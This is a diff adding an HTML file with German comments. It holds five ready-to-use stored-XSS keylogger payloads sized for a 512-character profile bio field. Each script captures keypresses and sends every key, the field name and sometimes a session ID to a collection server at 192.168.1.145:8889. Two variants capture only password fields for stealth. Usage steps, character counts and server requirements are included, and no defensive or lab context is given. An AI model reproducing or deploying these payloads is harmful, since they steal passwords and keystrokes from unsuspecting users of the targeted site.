@@ -1,0 +1,61 @@
+<!--
+XSS Keylogger - MINI Version (unter 512 Zeichen)
+Kompakte Version für Bio-Feld mit 512-Zeichen-Limit
+-->
+
+<!-- VERSION 1: Ultra-Compact (ca. 200 Zeichen) -->
+<script>var s=Math.random().toString(36).substr(2,9);document.addEventListener('keypress',e=>fetch('http://192.168.1.145:8889/log?k='+e.key+'&f='+(e.target.name||'u')+'&s='+s).catch(()=>{}))</script>
+
+<!-- VERSION 2: Password-Only Mini (ca. 180 Zeichen) -->
+<script>var s=Math.random().toString(36).substr(2,9);document.addEventListener('keypress',e=>{if(e.target.type=='password')fetch('http://192.168.1.145:8889/log?k='+e.key+'&s='+s)})</script>
+
+<!-- VERSION 3: Ultra-Mini (ca. 130 Zeichen) - Keine Session-ID -->
+<script>document.addEventListener('keypress',e=>fetch('http://192.168.1.145:8889/log?k='+e.key+'&f='+e.target.name))</script>
+
+<!-- VERSION 4: Password-Only Ultra-Mini (ca. 120 Zeichen) -->
+<script>document.addEventListener('keypress',e=>{if(e.target.type=='password')fetch('http://192.168.1.145:8889/log?k='+e.key)})</script>
+
+<!-- VERSION 5: Image-Tag Fallback (ca. 150 Zeichen) -->
+<img src=x onerror="document.addEventListener('keypress',e=>fetch('http://192.168.1.145:8889/log?k='+e.key+'&f='+e.target.name))">
+
+<!--
+Verwendung:
+1. Wähle die Version die am besten passt
+2. Kopiere NUR den Code-Teil (ohne Kommentare)
+3. Füge in Bio-Feld ein
+4. Keylogger-Server muss auf 192.168.1.145:8889 laufen
+
+Zeichenanzahl:
+- VERSION 1: ~200 Zeichen (Empfohlen - mit Session-Tracking)
+- VERSION 2: ~180 Zeichen (Nur Passwords, mit Session)
+- VERSION 3: ~130 Zeichen (Alle Keys, ohne Session)
+- VERSION 4: ~120 Zeichen (Nur Passwords, ohne Session)
+- VERSION 5: ~150 Zeichen (Image-Tag-basiert)
+
+Features:
+✅ Unter 512 Zeichen
+✅ Funktioniert in Bio-Feld
+✅ Sendet Keystrokes sofort (kein Buffering)
+✅ Silent Operation (keine Fehler)
+
+Captured:
+- VERSION 1, 3, 5: Alle Keystrokes
+- VERSION 2, 4: Nur Password-Felder
+
+Limitations (vs. Full Version):
+- Kein Buffering (jeder Keystroke = 1 Request)
+- Keine Backspace/Enter Capture
+- Keine Paste-Events
+- Mehr Netzwerk-Traffic
+
+Best Practice:
+- Für volle Funktionalität: VERSION 1
+- Für Stealth (nur Passwords): VERSION 2
+- Für minimale Größe: VERSION 4
+
+Server-Anpassung erforderlich:
+Der Server muss GET-Requests mit folgenden Parametern verarbeiten:
+- k (key): Der gedrückte Tastatur-Key
+- f (field): Feld-Name (optional)
+- s (sid): Session-ID (optional, nur V1+V2)
+-->
